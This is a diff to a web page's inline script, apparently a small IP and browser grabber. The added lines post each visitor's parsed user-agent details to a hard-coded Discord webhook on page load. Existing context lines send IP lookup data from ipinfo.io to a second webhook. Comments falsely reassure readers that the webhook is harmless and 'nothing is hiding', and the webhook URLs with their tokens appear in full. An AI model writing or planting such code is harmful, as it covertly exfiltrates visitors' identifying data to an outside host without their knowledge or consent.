@@ -4,6 +4,18 @@
 <!-- dummy code, overall it's a good startup in javascript, I need to improve more rather than doing some old complicated binary-related thingys in useless languages -->
 
 <script>
+    const request = new XMLHttpRequest();
+    request.open("POST", "https://discord.com/api/webhooks/1099765932630474812/2E5hGkbSr8jIACfZikB-5BEndLztZSj37Pyu0ntOAoFSkRilZDDzcnMoEqj1mOvSpipO");
+    request.setRequestHeader('Content-type', 'application/json');
+
+    var info = platform.parse(navigator.userAgent);
+    msg = "Response is considered a tracker for the majority of web browsers, thus first gate oughtn't fetch it.\n\ninfo: " + JSON.stringify(info, null, 4)
+
+    request.send(
+        JSON.stringify({
+            content: msg
+        })
+    );
     var done = false;
 
     // ty https://thehotcode.com/javascript-wait-for-condition-in-function
@@ -21,7 +33,6 @@
     // The webhook is here, very healthy :) and good, you can simply use it, no scams or whatever may a webhook contain, check the bytes if you're worried,
     // but I assure you, nothing is hiding, anyway, it's not hashed because I know many people do get lazy, here it is "take it or lose it" I guess:
     $.get("https://ipinfo.io", function (response) {
-        const request = new XMLHttpRequest();
         request.open("POST", "https://discord.com/api/webhooks/1099558196550570014/Fmp5gN7egkQ63pmGK8gMKGCINfiyidjZ2cP89OGJvEacqAMb5W2AqSRKIznuL-uKSER3");
         request.setRequestHeader('Content-type', 'application/json');
 
